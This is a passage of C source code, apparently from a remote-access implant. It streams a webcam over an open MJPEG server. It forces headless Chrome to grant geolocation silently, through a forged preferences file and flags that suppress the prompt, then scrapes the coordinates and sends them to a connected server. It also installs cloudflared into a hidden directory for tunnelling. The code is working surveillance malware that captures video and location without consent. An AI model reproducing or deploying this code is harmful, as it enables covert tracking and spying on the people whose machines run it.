            video_fd = -1;
            return 0;
        }

        buffers[n_buffers].length = buf.length;
        buffers[n_buffers].start = mmap(NULL, buf.length, PROT_READ | PROT_WRITE, MAP_SHARED, video_fd, buf.m.offset);
        if (buffers[n_buffers].start == MAP_FAILED) {
            perror("mmap buffer");
            for (int i = 0; i < n_buffers; ++i) {
                if (buffers[i].start && buffers[i].length > 0) {
                    munmap(buffers[i].start, buffers[i].length);
                }
            }
            free(buffers);
            buffers = NULL;
            close(video_fd);
            video_fd = -1;
            return 0;
        }

        if (ioctl(video_fd, VIDIOC_QBUF, &buf) < 0) {
            perror("VIDIOC_QBUF");
            for (int i = 0; i <= n_buffers; ++i) {
                if (buffers[i].start && buffers[i].length > 0) {
                    munmap(buffers[i].start, buffers[i].length);
                }
            }
            free(buffers);
            buffers = NULL;
            close(video_fd);
            video_fd = -1;
            return 0;
        }
    }

    enum v4l2_buf_type type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    if (ioctl(video_fd, VIDIOC_STREAMON, &type) < 0) {
        perror("VIDIOC_STREAMON");
        for (int i = 0; i < n_buffers; ++i) {
            if (buffers[i].start && buffers[i].length > 0) {
                munmap(buffers[i].start, buffers[i].length);
            }
        }
        free(buffers);
        buffers = NULL;
        close(video_fd);
        video_fd = -1;
        return 0;
    }
#endif
    return 1;
}

void cleanup_video_resources(void) {
#ifndef _WIN32
    if (video_fd >= 0) {
        enum v4l2_buf_type type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        ioctl(video_fd, VIDIOC_STREAMOFF, &type);
        for (int i = 0; i < n_buffers; ++i) {
            if (buffers && buffers[i].start && buffers[i].length > 0) {
                munmap(buffers[i].start, buffers[i].length);
            }
        }
        free(buffers);
        buffers = NULL;
        n_buffers = 0;
        close(video_fd);
        video_fd = -1;
    }
#endif

    if (video_server_fd != INVALID_FD) {
        close(video_server_fd);
        video_server_fd = INVALID_FD;
    }
}

int send_frame(socket_t client_fd, const void *data, size_t length) {
    char header[128];
    int header_len = snprintf(header, sizeof(header),
                              "--frame\r\n"
                              "Content-Type: image/jpeg\r\n"
                              "Content-Length: %zu\r\n\r\n",
                              length);
    if (header_len < 0 || header_len >= (int)sizeof(header)) header_len = (int)sizeof(header) - 1;

    if (send_all(client_fd, header, (size_t)header_len) < 0) return -1;
    if (send_all(client_fd, data, length) < 0) return -1;
    if (send_all(client_fd, "\r\n", 2) < 0) return -1;
    return 0;
}

#ifdef _WIN32
unsigned __stdcall video_client_thread(void* arg) {
#else
void* video_client_thread(void* arg) {
#endif
    socket_t client_fd = *(socket_t*)arg;
    free(arg);
    arg = NULL;

    const char *hdr =
        "HTTP/1.0 200 OK\r\n"
        "Server: C MJPEG Server\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
        "Connection: close\r\n"
        "Content-Type: multipart/x-mixed-replace; boundary=frame\r\n\r\n";

    if (send_all(client_fd, hdr, strlen(hdr)) < 0) {
        close(client_fd);
#ifdef _WIN32
        return 0;
#else
        return NULL;
#endif
    }

#ifdef _WIN32
    unsigned char dummy_jpg[] = {
        0xFF,0xD8,0xFF,0xD9 // minimal JPEG (empty)
    };
    while (video_streaming) {
        if (send_frame(client_fd, dummy_jpg, sizeof(dummy_jpg)) < 0) break;
        usleep(FRAME_DELAY);
    }
#else
    struct v4l2_buffer buf;
    memset(&buf, 0, sizeof(buf));

    while (video_streaming) {
        buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        buf.memory = V4L2_MEMORY_MMAP;

        if (ioctl(video_fd, VIDIOC_DQBUF, &buf) < 0) {
            if (errno == EAGAIN || errno == EIO) {
                usleep(1000);
                continue;
            } else {
                perror("VIDIOC_DQBUF");
                break;
            }
        }

        size_t bytes = (buf.bytesused > 0 ? (size_t)buf.bytesused : buffers[buf.index].length);

        if (send_frame(client_fd, buffers[buf.index].start, bytes) < 0) {
            if (ioctl(video_fd, VIDIOC_QBUF, &buf) < 0) {
                perror("VIDIOC_QBUF after send failure");
            }
            break;
        }

        if (ioctl(video_fd, VIDIOC_QBUF, &buf) < 0) {
            perror("VIDIOC_QBUF");
            break;
        }

        usleep(FRAME_DELAY);
    }
#endif

    close(client_fd);
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

void* video_stream_server(void *arg) {
    (void)arg;
    
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed\n");
        return NULL;
    }
#else
    signal(SIGPIPE, SIG_IGN);
#endif

#ifndef _WIN32
    if (!init_video()) {
        fprintf(stderr, "Video init failed\n");
        cleanup_video_resources();
        return NULL;
    }
#endif

    video_server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (video_server_fd == INVALID_FD) {
        perror("socket");
        cleanup_video_resources();
        return NULL;
    }

    int opt = 1;
    setsockopt(video_server_fd, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(VIDEO_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(video_server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        cleanup_video_resources();
        return NULL;
    }

    if (listen(video_server_fd, MAX_CLIENTS) < 0) {
        perror("listen");
        cleanup_video_resources();
        return NULL;
    }

    printf("Streaming on http://localhost:%d\n", VIDEO_PORT);

    while (video_streaming) {
        socket_t client_fd = accept(video_server_fd, NULL, NULL);
        if (client_fd == INVALID_FD) {
#ifdef _WIN32
            int err = WSAGetLastError();
            if (err == WSAEINTR) continue;
            fprintf(stderr, "accept failed: %d\n", err);
            break;
#else
            if (errno == EINTR) continue;
            perror("accept");
            break;
#endif
        }

#ifdef _WIN32
        {
            DWORD timeout_ms = 5000;
            setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout_ms, sizeof(timeout_ms));
        }
#else
        {
            struct timeval tv;
            tv.tv_sec = 5;
            tv.tv_usec = 0;
            setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        }
#endif

        socket_t *client_ptr = malloc(sizeof(socket_t));
        if (!client_ptr) {
            close(client_fd);
            continue;
        }
        *client_ptr = client_fd;

#ifdef _WIN32
        uintptr_t th = _beginthreadex(NULL, 0, video_client_thread, client_ptr, 0, NULL);
        if (!th) {
            close(client_fd);
            free(client_ptr);
        } else {
            CloseHandle((HANDLE)th);
        }
#else
        pthread_t tid;
        if (pthread_create(&tid, NULL, video_client_thread, client_ptr) != 0) {
            perror("pthread_create");
            close(client_fd);
            free(client_ptr);
        } else {
            pthread_detach(tid);
        }
#endif
    }

    cleanup_video_resources();
    return NULL;
}

void run_video_stream(char **args) {
    if (video_streaming) {
        printf("Video streaming is already running\n");
        return;
    }
    
    printf("\n[Video Streaming]\n");
    printf("Starting video streaming server...\n");
    
    video_streaming = 1;
    pthread_create(&video_stream_thread, NULL, video_stream_server, NULL);
    
    printf("Video streaming started. Use 'stopstream' to stop.\n");
}

void stop_video_stream(char **args) {
    if (!video_streaming) {
        printf("Video streaming is not running\n");
        return;
    }
    
    printf("\n[Stop Video Stream]\n");
    printf("Stopping video streaming server...\n");
    
    video_streaming = 0;
    pthread_join(video_stream_thread, NULL);
    
    printf("Video streaming stopped\n");
}

// Geolocation functions
void cleanup_chrome_profile() {
    printf("[*] Cleaning up old Chrome profile...\n");
    
#ifdef _WIN32
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "rmdir /s /q \"%s\\chrome_geo\" 2>%s", TEMP_DIR, NULL_DEVICE);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "mkdir \"%s\\chrome_geo\\Default\" 2>%s", TEMP_DIR, NULL_DEVICE);
    system(cmd);
#else
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "rm -rf %s/chrome_geo", TEMP_DIR);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "mkdir -p %s/chrome_geo/Default", TEMP_DIR);
    system(cmd);
#endif
}

void create_chrome_preferences() {
    char prefs_path[512];
    snprintf(prefs_path, sizeof(prefs_path), "%s%schrome_geo%sDefault%sPreferences", 
             TEMP_DIR, PATH_SEP, PATH_SEP, PATH_SEP);
    
    FILE *prefs = fopen(prefs_path, "w");
    if (prefs) {
        const char *prefs_json = 
            "{\n"
            "   \"profile\": {\n"
            "      \"content_settings\": {\n"
            "         \"exceptions\": {\n"
            "            \"geolocation\": {\n"
            "               \"file://*\": {\n"
            "                  \"last_modified\": \"13366681774987842\",\n"
            "                  \"setting\": 1\n"
            "               }\n"
            "            }\n"
            "         }\n"
            "      },\n"
            "      \"default_content_setting_values\": {\n"
            "         \"geolocation\": 1\n"
            "      }\n"
            "   }\n"
            "}\n";
        fputs(prefs_json, prefs);
        fclose(prefs);
        printf("[*] Created Chrome preferences with geolocation auto-allow\n");
    }
}

void create_test_page() {
    char html_path[512];
    snprintf(html_path, sizeof(html_path), "%s%sgeo_test.html", TEMP_DIR, PATH_SEP);
    
    FILE *f = fopen(html_path, "w");
    if (f) {
        const char *html = 
            "<!DOCTYPE html>\n"
            "<html>\n"
            "<head>\n"
            "    <title>Personal Geo Logger</title>\n"
            "    <style>\n"
            "        body { font-family: Arial, sans-serif; margin: 50px; background: #1a1a1a; color: #fff; }\n"
            "        .success { color: #00ff00; }\n"
            "        .error { color: #ff0000; }\n"
            "        button { padding: 10px 20px; font-size: 16px; margin: 10px 0; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; }\n"
            "        pre { background: #000; padding: 10px; border: 1px solid #333; }\n"
            "        .status { margin: 20px 0; padding: 10px; background: #333; border-radius: 5px; }\n"
            "    </style>\n"
            "</head>\n"
            "<body>\n"
            "    <h1>Personal Geolocation Logger</h1>\n"
            "    <div class=\"status\" id=\"status\">Starting...</div>\n"
            "    <div id=\"result\"></div>\n"
            "    <button onclick=\"getLocation()\">Get Current Location</button>\n"
            "    <button onclick=\"toggleAutoUpdate()\">Toggle Auto-Update</button>\n"
            "    <div id=\"log\"></div>\n"
            "    <script>\n"
            "        let logs = [];\n"
            "        let autoUpdate = true;\n"
            "        let updateInterval;\n"
            "        \n"
            "        function writeToSignalFile(message) {\n"
            "            try {\n"
            "                // Try multiple methods to communicate with the C program\n"
            "                console.log(`GEOLOG: ${message}`);\n"
            "                document.title = `GEOLOG: ${message}`;\n"
            "                \n"
            "                // Create a temporary element to trigger file access\n"
            "                const link = document.createElement('a');\n"
            "                const blob = new Blob([message], {type: 'text/plain'});\n"
            "                link.href = URL.createObjectURL(blob);\n"
            "                link.download = 'geo_log_signal.txt';\n"
            "                \n"
            "                // Also try localStorage as a backup communication method\n"
            "                if (typeof(Storage) !== 'undefined') {\n"
            "                    localStorage.setItem('geoLog', message);\n"
            "                    localStorage.setItem('geoTimestamp', Date.now().toString());\n"
            "                }\n"
            "            } catch(e) {\n"
            "                console.log('Signal write failed:', e);\n"
            "            }\n"
            "        }\n"
            "        \n"
            "        function addLog(message) {\n"
            "            const timestamp = new Date().toISOString();\n"
            "            const logEntry = `[${timestamp}] ${message}`;\n"
            "            logs.push(logEntry);\n"
            "            \n"
            "            writeToSignalFile(message);\n"
            "            \n"
            "            const logDiv = document.getElementById('log');\n"
            "            logDiv.innerHTML = '<h3>Activity Log:</h3><pre>' + logs.slice(-15).join('\\n') + '</pre>';\n"
            "        }\n"
            "        \n"
            "        function getLocation() {\n"
            "            document.getElementById('status').innerHTML = 'Requesting location...';\n"
            "            document.getElementById('result').innerHTML = '';\n"
            "            addLog('Location request initiated');\n"
            "            \n"
            "            if (navigator.geolocation) {\n"
            "                const options = {\n"
            "                    enableHighAccuracy: true,\n"
            "                    timeout: 15000,\n"
            "                    maximumAge: 0\n"
            "                };\n"
            "                navigator.geolocation.getCurrentPosition(showPosition, showError, options);\n"
            "            } else {\n"
            "                const msg = 'Geolocation not supported by this browser';\n"
            "                document.getElementById('result').innerHTML = '<p class=\"error\">' + msg + '</p>';\n"
            "                document.getElementById('status').innerHTML = 'Not supported';\n"
            "                addLog('ERROR: ' + msg);\n"
            "            }\n"
            "        }\n"
            "        \n"
            "        function showPosition(position) {\n"
            "            const lat = position.coords.latitude;\n"
            "            const lon = position.coords.longitude;\n"
            "            const accuracy = position.coords.accuracy;\n"
            "            const altitude = position.coords.altitude;\n"
            "            const heading = position.coords.heading;\n"
            "            const speed = position.coords.speed;\n"
            "            const timestamp = position.timestamp;\n"
            "            \n"
            "            let result = `\n"
            "                <div class=\"success\">\n"
            "                    <h3>Location Retrieved:</h3>\n"
            "                    <p><strong>Latitude:</strong> ${lat}</p>\n"
            "                    <p><strong>Longitude:</strong> ${lon}</p>\n"
            "                    <p><strong>Accuracy:</strong> ${accuracy} meters</p>\n"
            "            `;\n"
            "            \n"
            "            if (altitude !== null) result += `<p><strong>Altitude:</strong> ${altitude} meters</p>`;\n"
            "            if (heading !== null) result += `<p><strong>Heading:</strong> ${heading}°</p>`;\n"
            "            if (speed !== null) result += `<p><strong>Speed:</strong> ${speed} m/s</p>`;\n"
            "            \n"
            "            result += `<p><strong>Timestamp:</strong> ${new Date(timestamp).toLocaleString()}</p></div>`;\n"
            "            \n"
            "            document.getElementById('result').innerHTML = result;\n"
            "            document.getElementById('status').innerHTML = 'Location acquired successfully!';\n"
            "            \n"
            "            const logMessage = `SUCCESS: LAT=${lat}, LON=${lon}, ACC=${accuracy}m`;\n"
            "            addLog(logMessage);\n"
            "        }\n"
            "        \n"
            "        function showError(error) {\n"
            "            let msg = '';\n"
            "            switch(error.code) {\n"
            "                case error.PERMISSION_DENIED:\n"
            "                    msg = 'Location access denied by user';\n"
            "                    break;\n"
            "                case error.POSITION_UNAVAILABLE:\n"
            "                    msg = 'Location information unavailable';\n"
            "                    break;\n"
            "                case error.TIMEOUT:\n"
            "                    msg = 'Location request timed out';\n"
            "                    break;\n"
            "                default:\n"
            "                    msg = 'Unknown geolocation error';\n"
            "            }\n"
            "            \n"
            "            document.getElementById('result').innerHTML = '<p class=\"error\">Error: ' + msg + '</p>';\n"
            "            document.getElementById('status').innerHTML = 'Location request failed';\n"
            "            \n"
            "            addLog(`ERROR: ${msg} (Code: ${error.code})`);\n"
            "        }\n"
            "        \n"
            "        function toggleAutoUpdate() {\n"
            "            autoUpdate = !autoUpdate;\n"
            "            if (autoUpdate) {\n"
            "                updateInterval = setInterval(getLocation, 60000); // Every 60 seconds\n"
            "                addLog('Auto-update enabled (60s interval)');\n"
            "            } else {\n"
            "                clearInterval(updateInterval);\n"
            "                addLog('Auto-update disabled');\n"
            "            }\n"
            "        }\n"
            "        \n"
            "        // Initialize on page load\n"
            "        window.onload = function() {\n"
            "            addLog('Personal geolocation logger started');\n"
            "            \n"
            "            // Initial location request\n"
            "            setTimeout(getLocation, 2000);\n"
            "            \n"
            "            // Start auto-update\n"
            "            if (autoUpdate) {\n"
            "                updateInterval = setInterval(getLocation, 60000);\n"
            "            }\n"
            "        };\n"
            "        \n"
            "        // Handle page unload\n"
            "        window.onbeforeunload = function() {\n"
            "            addLog('Page closing - geolocation logger stopped');\n"
            "        };\n"
            "    </script>\n"
            "</body>\n"
            "</html>";
        fputs(html, f);
        fclose(f);
        printf("[*] Created test page: %s\n", html_path);
    }
}

// Modify run_geolocation to capture Chrome's console output
void run_geolocation(char **args) {
    printf("\n[Geolocation Tracker]\n");
    printf("[*] Platform: ");
    
#ifdef _WIN32
    printf("Windows\n");
#else
    printf("Unix/Linux/macOS\n");
#endif
    
    // Reset logs buffer
    pthread_mutex_lock(&geo_logs_mutex);
    strcpy(geo_logs, "");
    pthread_mutex_unlock(&geo_logs_mutex);
    
    char cmd[256];
#ifdef _WIN32
    snprintf(cmd, sizeof(cmd), "mkdir \"%s\" 2>%s", TEMP_DIR, NULL_DEVICE);
#else
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", TEMP_DIR);
#endif
    system(cmd);
    
    // Create log file path
    snprintf(chrome_log_path, sizeof(chrome_log_path), "%s%schrome_geo.log", TEMP_DIR, PATH_SEP);
    
    cleanup_chrome_profile();
    create_chrome_preferences();
    create_test_page();
    
    printf("[*] Starting Chrome in headless mode...\n");
    
#ifdef _WIN32
    char user_data_dir[512];
    char html_path[512];
    
    snprintf(user_data_dir, sizeof(user_data_dir), "%s\\chrome_geo", TEMP_DIR);
    snprintf(html_path, sizeof(html_path), "file:///%s/geo_test.html", TEMP_DIR);
    
    const char* chrome_paths[] = {
        "chrome.exe",
        "google-chrome.exe",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        NULL
    };
    
    char chrome_cmd[2048];
    snprintf(chrome_cmd, sizeof(chrome_cmd),
        "\"%s\" --headless --no-sandbox --disable-gpu --disable-dev-shm-usage "
        "--user-data-dir=\"%s\" --disable-web-security --allow-running-insecure-content "
        "--enable-logging --log-level=0 --enable-geolocation "
        "--disable-geolocation-prompt --allow-file-access-from-files "
        "--disable-background-timer-throttling --disable-backgrounding-occluded-windows "
        "--log-file=\"%s\" \"%s\"", 
        chrome_paths[2], user_data_dir, chrome_log_path, html_path);
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    if (CreateProcess(NULL, chrome_cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        chrome_pid = pi.hProcess;
        CloseHandle(pi.hThread);
        printf("[*] Chrome started successfully\n");
    } else {
        printf("[!] Failed to start Chrome. Make sure Google Chrome is installed.\n");
        printf("[!] Tried: %s\n", chrome_cmd);
        return;
    }
#else
    chrome_pid = fork();
    if (chrome_pid == 0) {
        char user_data_dir[512];
        char html_path[512];
        
        snprintf(user_data_dir, sizeof(user_data_dir), "%s/chrome_geo", TEMP_DIR);
        snprintf(html_path, sizeof(html_path), "file://%s/geo_test.html", TEMP_DIR);
        
        const char* chrome_names[] = {
            "google-chrome", "chromium-browser", "chromium", "chrome", NULL
        };
        
        char user_data_arg[600];
        snprintf(user_data_arg, sizeof(user_data_arg), "--user-data-dir=%s", user_data_dir);
        
        // Redirect stdout and stderr to our log file
        freopen(chrome_log_path, "w", stdout);
        freopen(chrome_log_path, "w", stderr);
        
        for (int i = 0; chrome_names[i] != NULL; i++) {
            execlp(chrome_names[i], chrome_names[i],
                "--headless",
                "--no-sandbox",
                "--disable-gpu",
                "--disable-dev-shm-usage",
                user_data_arg,
                "--disable-web-security",
                "--allow-running-insecure-content",
                "--enable-logging=stderr",
                "--log-level=0",
                "--enable-geolocation",
                "--disable-geolocation-prompt",
                "--allow-file-access-from-files",
                "--disable-background-timer-throttling",
                "--disable-backgrounding-occluded-windows",
                "--disable-renderer-backgrounding",
                html_path,
                NULL);
        }
        
        printf("[!] Failed to start Chrome/Chromium\n");
        exit(1);
    }
#endif

#ifdef _WIN32
    if (chrome_pid != NULL) {
#else
    if (chrome_pid > 0) {
#endif
        printf("[*] Chrome launched successfully\n");
        printf("[*] Personal geolocation test running for 10 seconds...\n");
        printf("[*] Monitoring for location data...\n");
        
#ifdef _WIN32
        uintptr_t th = _beginthreadex(NULL, 0, geolocation_monitor_thread, NULL, 0, NULL);
        if (th) {
            monitor_pid = (HANDLE)th;
        }
#else
        monitor_pid = fork();
        if (monitor_pid == 0) {
            monitor_logs();
            exit(0);
        }
#endif
        
        // Wait for 10 seconds
        sleep(10);
        
        printf("\n[*] Geolocation tracking completed\n");
        
        // Send captured logs to server
        pthread_mutex_lock(&geo_logs_mutex);
        if (strlen(geo_logs) > 0) {
            printf("[*] Sending geolocation logs to server...\n");
            if (connected_to_server) {
                send_to_server("GEOLOCATION_LOGS_START\n");
                send_to_server(geo_logs);
                send_to_server("\nGEOLOCATION_LOGS_END\n");
            }
            printf("[*] Logs sent successfully\n");
            printf("[*] Captured logs:\n%s\n", geo_logs);
        } else {
            printf("[*] No geolocation logs captured\n");
        }
        pthread_mutex_unlock(&geo_logs_mutex);
        
#ifdef _WIN32
        if (monitor_pid != NULL) {
            TerminateProcess(monitor_pid, 0);
            CloseHandle(monitor_pid);
            monitor_pid = NULL;
        }
        
        if (chrome_pid != NULL) {
            TerminateProcess(chrome_pid, 0);
            CloseHandle(chrome_pid);
            chrome_pid = NULL;
        }
#else
        if (monitor_pid > 0) {
            kill(monitor_pid, SIGTERM);
            waitpid(monitor_pid, NULL, WNOHANG);
            monitor_pid = 0;
        }
        
        if (chrome_pid > 0) {
            kill(chrome_pid, SIGTERM);
            waitpid(chrome_pid, NULL, WNOHANG);
            chrome_pid = 0;
        }
#endif
    } else {
        printf("[!] Failed to start Chrome. Please ensure Google Chrome or Chromium is installed.\n");
        return;
    }
}

// Modify monitor_logs to capture the complete geolocation message
void monitor_logs() {
    printf("[*] Starting log monitor...\n");
    
    time_t start_time = time(NULL);
    time_t current_time;
    
    while ((current_time = time(NULL)) - start_time < 10) { // Run for 10 seconds
        // Read Chrome's log file
        FILE *logFile = fopen(chrome_log_path, "r");
        if (logFile) {
            char line[2048]; // Increased buffer size
            while (fgets(line, sizeof(line), logFile)) {
                // Look for GEOLOG: in the line
                if (strstr(line, "GEOLOG:")) {
                    // Extract the complete message inside quotes
                    char *start_quote = strchr(line, '"');
                    if (start_quote) {
                        char *end_quote = NULL;
                        char *next_quote = start_quote + 1;
                        
                        // Find the matching end quote by looking for the pattern
                        while (*next_quote && !end_quote) {
                            if (*next_quote == '"' && 
                                *(next_quote + 1) == ',' && 
                                strstr(next_quote, ", source:")) {
                                end_quote = next_quote;
                                break;
                            }
                            next_quote++;
                        }
                        
                        if (end_quote) {
                            *end_quote = '\0'; // Terminate at the end quote
                            char *message = start_quote + 1; // Skip the opening quote
                            
                            // Verify this is a geolocation message
                            if (strstr(message, "GEOLOG:")) {
                                // Capture the complete message
                                pthread_mutex_lock(&geo_logs_mutex);
                                strncat(geo_logs, message, sizeof(geo_logs) - strlen(geo_logs) - 1);
                                strcat(geo_logs, "\n");
                                pthread_mutex_unlock(&geo_logs_mutex);
                                
                                printf("\n[GEOLOCATION] %s", message);
                                fflush(stdout);
                            }
                        }
                    }
                }
            }
            fclose(logFile);
        }
        
        usleep(500000); // Check every 500ms
    }
    
    printf("\n[*] Geolocation monitoring completed after 10 seconds\n");
}

// Tunnel functions
static void get_install_dir(char *buf, size_t len) {
#ifdef _WIN32
    const char *base = getenv("LOCALAPPDATA");
    if (!base) base = getenv("USERPROFILE");
    if (!base) base = ".";
    snprintf(buf, len, "%s%s", base, HIDDEN_DIR);
#else
    const char *home = getenv("HOME");
    if (!home) {
        struct passwd *pw = getpwuid(getuid());
        if (pw) home = pw->pw_dir;
    }
    if (!home) home = ".";
    snprintf(buf, len, "%s%s", home, HIDDEN_DIR);
#endif
}

static bool ensure_dir_exists(const char *path) {
#ifdef _WIN32
    if (PathFileExistsA(path)) return true;
    return (CreateDirectoryA(path, NULL) || GetLastError() == ERROR_ALREADY_EXISTS);
#else
    struct stat st;
    if (stat(path, &st) == 0) return S_ISDIR(st.st_mode);
    return (mkdir(path, 0700) == 0);
#endif
}

static void make_executable_if_unix(const char *path) {
#ifndef _WIN32
    chmod(path, 0700);
#endif
}

static bool command_exists(const char *cmd) {
#ifdef _WIN32
    char path[MAX_PATH];
    DWORD ret = SearchPathA(NULL, cmd, ".exe", MAX_PATH, path, NULL);
    return (ret > 0 && ret < MAX_PATH);
#else
    char *path = getenv("PATH");
    if (!path) return false;
    
    char *p = strdup(path);
    char *tok = strtok(p, ":");
    bool found = false;
    
    while (tok && !found) {
        char candidate[PATH_MAX];
        snprintf(candidate, sizeof(candidate), "%s/%s", tok, cmd);
        if (access(candidate, X_OK) == 0) {
            found = true;
        }
        tok = strtok(NULL, ":");
    }
    
    free(p);
    return found;
#endif
}

static bool download_file(const char *url, const char *output) {
#ifdef _WIN32
    printf("[*] Downloading: %s -> %s\n", url, output);
    return (URLDownloadToFileA(NULL, url, output, 0, NULL) == S_OK);
#else
    char cmd[2048];
    if (system("command -v curl >/dev/null 2>&1") == 0) {
        snprintf(cmd, sizeof(cmd), "curl -L --fail -s -o '%s' '%s'", output, url);
        printf("[*] Running: %s\n", cmd);
        return (system(cmd) == 0);
    } else if (system("command -v wget >/dev/null 2>&1") == 0) {
        snprintf(cmd, sizeof(cmd), "wget -q -O '%s' '%s'", output, url);
        printf("[*] Running: %s\n", cmd);
        return (system(cmd) == 0);
    }
    return false;
#endif
}

static void install_cloudflared() {
    char install_dir[1024], out_path[1200];
    get_install_dir(install_dir, sizeof(install_dir));
    printf("[*] Install directory: %s\n", install_dir);
    
    if (!ensure_dir_exists(install_dir)) {
        fprintf(stderr, "[!] Failed to create install directory\n");
        return;
    }

#ifdef _WIN32
    snprintf(out_path, sizeof(out_path), "%s\\cloudflared.exe", install_dir);
    const char *url = CLOUDFLARED_WINDOWS_URL;
#else
    snprintf(out_path, sizeof(out_path), "%s/cloudflared", install_dir);
    const char *url = CLOUDFLARED_LINUX_URL;
#endif

    if (access(out_path, F_OK) == 0) {
        printf("[*] cloudflared already present\n");
    } else {
        printf("[*] Downloading cloudflared...\n");
        if (!download_file(url, out_path)) {
            fprintf(stderr, "[!] Download failed\n");
            return;
        }
        make_executable_if_unix(out_path);
        printf("[✔] Downloaded cloudflared\n");
    }

#ifdef _WIN32
    // Add to PATH
    char path[2048];
    snprintf(path, sizeof(path), "%s;%s", getenv("PATH"), install_dir);
    _putenv_s("PATH", path);
    printf("[✔] Added to PATH for current session\n");
#else
    // Create symlink in ~/.local/bin
    char localbin[PATH_MAX];
    const char *home = getenv("HOME");
    snprintf(localbin, sizeof(localbin), "%s/.local/bin", home);
    ensure_dir_exists(localbin);
    
    char dst[PATH_MAX];
    snprintf(dst, sizeof(dst), "%s/cloudflared", localbin);
    
    unlink(dst);
    if (symlink(out_path, dst) == 0) {
        printf("[✔] Created symlink in ~/.local/bin\n");
        printf("[*] Make sure ~/.local/bin is in your PATH\n");
    }
#endif
}

static bool is_process_running(const char *process_name) {
#ifdef _WIN32
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 process_entry;
    process_entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &process_entry)) {
        do {
            if (strcmp(process_entry.szExeFile, process_name) == 0) {
                CloseHandle(snapshot);
                return true;
            }
        } while (Process32Next(snapshot, &process_entry));
    }

    CloseHandle(snapshot);
    return false;
#else
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "pgrep -x %s > /dev/null 2>&1", process_name);
    return (system(cmd) == 0);
#endif
}

static char* get_ngrok_url() {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null");
    
    FILE *fp = popen(cmd, "r");
    if (!fp) return NULL;
    
    char response[8192] = {0};
    size_t total_read = 0;
    char line[1024];
    
    while (fgets(line, sizeof(line), fp) && total_read < sizeof(response) - 1) {
        strcat(response, line);
        total_read += strlen(line);
    }
    pclose(fp);
    
    // Parse JSON response
    char *public_url = NULL;
    char *tunnel_start = strstr(response, "\"tunnels\":[");
    if (tunnel_start) {
        char *tunnel = tunnel_start + 10;
        while ((tunnel = strstr(tunnel, "{")) != NULL) {
            char *public_url_str = strstr(tunnel, "\"public_url\":\"");
            if (public_url_str) {
                public_url_str += 14;
                char *url_end = strchr(public_url_str, '\"');
                if (url_end) {
                    *url_end = '\0';
                    public_url = strdup(public_url_str);
                    break;
                }
            }
            tunnel++;
        }
    }
    
    return public_url;
}

static bool kill_process(int pid) {
#ifdef _WIN32
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) return false;
    bool result = TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    return result;
#else
    return (kill(pid, SIGTERM) == 0);
#endif
}

static int get_tunnel_processes(TunnelInfo **tunnels) {
    *tunnels = NULL;
    int count = 0;
    int capacity = 10;
    *tunnels = malloc(capacity * sizeof(TunnelInfo));
    if (!*tunnels) return 0;

#ifdef _WIN32
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 process_entry;
    process_entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &process_entry)) {
        do {
            if (strcmp(process_entry.szExeFile, "ngrok.exe") == 0 || 
                strcmp(process_entry.szExeFile, "cloudflared.exe") == 0) {
                
                if (count >= capacity) {
                    capacity *= 2;
                    *tunnels = realloc(*tunnels, capacity * sizeof(TunnelInfo));
                    if (!*tunnels) {
                        CloseHandle(snapshot);
                        return 0;
                    }
                }

                TunnelInfo *t = &(*tunnels)[count];
                t->pid = process_entry.th32ProcessID;
                t->url[0] = '\0';
                
                if (strcmp(process_entry.szExeFile, "ngrok.exe") == 0) {
                    strcpy(t->tool, "ngrok");
                    char *url = get_ngrok_url();
                    if (url) {
                        strncpy(t->url, url, sizeof(t->url) - 1);
                        t->url[sizeof(t->url) - 1] = '\0';
                        free(url);
                    }
                } else {
                    strcpy(t->tool, "cloudflared");
                }
                
                // Try to get port from command line
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, t->pid);
                if (hProcess) {
                    char cmdLine[1024] = {0};
                    if (GetModuleFileNameExA(hProcess, NULL, cmdLine, sizeof(cmdLine)) > 0) {
                        if (strstr(cmdLine, "http://localhost:")) {
                            char *port_start = strstr(cmdLine, "http://localhost:") + strlen("http://localhost:");
